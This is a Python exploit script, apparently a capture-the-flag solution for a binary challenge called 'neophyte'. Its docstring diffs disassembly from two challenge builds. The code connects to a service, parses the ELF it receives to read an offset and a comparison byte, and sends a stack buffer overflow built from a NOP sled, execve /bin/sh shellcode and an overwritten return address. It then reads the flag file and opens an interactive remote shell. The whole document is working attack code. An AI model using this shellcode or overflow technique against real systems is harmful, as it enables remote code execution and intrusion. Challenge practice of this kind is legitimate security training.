#!/usr/bin/env python3
"""
diff -u neophyte1.jav neophyte2.jav 
--- neophyte1.jav       2016-08-05 19:09:09.935916641 -0700
+++ neophyte2.jav       2016-08-05 19:39:34.523799711 -0700
@@ -163,12 +163,12 @@
 vulnerable:
  804852f: PUSH EBP
  8048530: MOV EBP, ESP ; EBP = ESP; 
- 8048532: SUB ESP, 0x3db8 ; ESP -= 0x3db8; 
+ 8048532: SUB ESP, 0xea8 ; ESP -= 0xea8; 
  8048538: MOV EAX, [0x804a040] ; EAX = [0x804a040]; 
  804853d: SUB ESP, 0x4 ; ESP -= 0x4; 
  8048540: PUSH EAX
- 8048541: PUSH DWORD 0x41a4
- 8048546: LEA EAX, [EBP-0x3dac]
+ 8048541: PUSH DWORD 0x129c
+ 8048546: LEA EAX, [EBP-0xea4]
  804854c: PUSH EAX
  804854d: CALL 80483d0 <fgets>
  8048552: ADD ESP, 0x10 ; ESP += 0x10; 
@@ -201,8 +201,8 @@
  80485a0: ADD ESP, 0x10 ; ESP += 0x10; 
  80485a3: CALL 80483c0 <getchar>
  80485a8: MOV [EBP-0x9], AL ; [EBP-0x9] = AL; 
- 80485ab: CMP BYTE [EBP-0x9], 0x6b ;
- 80485af: JNZ 0x80485c8 ; if(BYTE [EBP-0x9] == 0x6b) {
+ 80485ab: CMP BYTE [EBP-0x9], 0x75 ;
+ 80485af: JNZ 0x80485c8 ; if(BYTE [EBP-0x9] == 0x75) {
  80485b1: SUB ESP, 0xc ; ESP -= 0xc; 
  80485b4: PUSH DWORD 0x8048670 ; 'good gatekeeper'
  80485b9: CALL 80483f0 <puts>
  
for i in $(seq 1 200); do echo 'new'; python3 neophyte1.py; done >gg3.txt
grep -A2 success gg3.txt
"""
import struct
import socket
import telnetlib

HOST, PORT = '172.31.1.46', 1622

# From HBW's exploit, I hope it works.
sc = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

varcmp = b'k'
#subesp = 0x3db8
sublea = 0x3dac
stackptr = 0xffb107f0

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))
q = s.recv(8000)
q1 = q
#if b'\x7fELF' not in q:
while len(q) < 7747:
	print('fail1', q1)
	if q1 == b'': exit(1)
	q1 = s.recv(8000)
	q += q1
#end if

elf = q[q.index(b'\x7fELF'):]

varcmp = elf[0x5ae:0x5af]
#subesp = struct.unpack('<H', elf[0x534:0x536])[0]
sublea = 0x10000 - struct.unpack('<H', elf[0x548:0x54a])[0]

#print('varcmp', varcmp, 'subesp', hex(subesp))
print('varcmp', varcmp, 'sublea', hex(sublea))

# Works every time
addr = 0x80485cb
# Works 1 in 150 times.
addr = 0xffff948c
#a = varcmp + (b'\x90'*(subesp-8-len(sc))) + sc + struct.pack('<I', stackptr-subesp) + b'\n'
#a = varcmp + (b'\x90'*(subesp-8-len(sc))) + sc + struct.pack('<I', addr) + b'\n'
a = varcmp + (b'\x90'*(sublea+4-len(sc)-50)) + sc + (b'\x90'*50) + struct.pack('<I', addr) + b'\n'

s.send(a)
print('resp', s.recv(1024))

s.send(b'cat /home/challenge/flag\n')
s.send(b'pwd\n')
print('resp success', s.recv(1024))

print("shell:")
ts = telnetlib.Telnet()
ts.sock = s
ts.interact()

s.close()

